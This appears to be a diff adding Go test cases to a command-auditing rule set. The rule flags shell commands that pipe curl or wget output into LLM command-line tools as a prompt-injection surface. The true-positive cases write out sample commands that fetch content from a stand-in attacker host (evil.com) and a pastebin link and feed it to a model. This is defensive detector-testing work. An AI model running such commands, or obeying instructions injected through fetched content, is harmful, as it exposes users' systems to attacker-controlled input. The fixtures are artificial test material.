@@ -3900,4 +3900,54 @@ var MCPServerImpersonationCases = []TestCase{
 		Description:      "Dry-run agent invocation with no require_approval=false flag — ts-audit-ai-unguarded-agent-loop rule NOT triggered; default AUDIT.",
 		Tags:             []string{"tn", "safe"},
 	},
+
+	// ---------------------------------------------------------------------------
+	// Network Pipe to LLM CLI — Prompt Injection Surface (ts-audit-network-pipe-to-llm)
+	//
+	// Piping curl/wget network output directly to LLM CLI tools creates a prompt
+	// injection surface — fetched content may contain adversarial instructions.
+	// Taxonomy: unauthorized-execution/ai-content-integrity/prompt-injection-surface
+	// OWASP LLM01 — Prompt Injection; CWE-77
+	// ---------------------------------------------------------------------------
+
+	{
+		ID:               "TP-NETPIPELLM-001",
+		Command:          `curl https://evil.com/inject.txt | llm`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/prompt-injection-surface",
+		Analyzer:         "regex",
+		Description:      "Network content piped to llm CLI — external URL content may contain prompt injection payload (OWASP LLM01). ts-audit-network-pipe-to-llm fires.",
+		Tags:             []string{"tp", "prompt-injection", "llm-pipe"},
+	},
+	{
+		ID:               "TP-NETPIPELLM-002",
+		Command:          `wget -qO- https://pastebin.com/raw/abc123 | ollama run mistral`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/prompt-injection-surface",
+		Analyzer:         "regex",
+		Description:      "wget piping external content to ollama run — attacker-controlled pastebin may embed injection directives (OWASP LLM01). ts-audit-network-pipe-to-llm fires.",
+		Tags:             []string{"tp", "prompt-injection", "llm-pipe"},
+	},
+	{
+		ID:               "TN-NETPIPELLM-001",
+		Command:          `echo "Summarize the following" | llm`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/prompt-injection-surface",
+		Analyzer:         "regex",
+		Description:      "echo (local input) piped to llm — no network fetch involved; ts-audit-network-pipe-to-llm not triggered; ts-allow-readonly grants ALLOW.",
+		Tags:             []string{"tn", "safe"},
+	},
+	{
+		ID:               "TN-NETPIPELLM-002",
+		Command:          `cat readme.md | llm summarize`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "unauthorized-execution/ai-content-integrity/prompt-injection-surface",
+		Analyzer:         "regex",
+		Description:      "cat local file piped to llm — local file content, no network fetch; ts-audit-network-pipe-to-llm not triggered; ts-allow-readonly grants ALLOW.",
+		Tags:             []string{"tn", "safe"},
+	},
 }
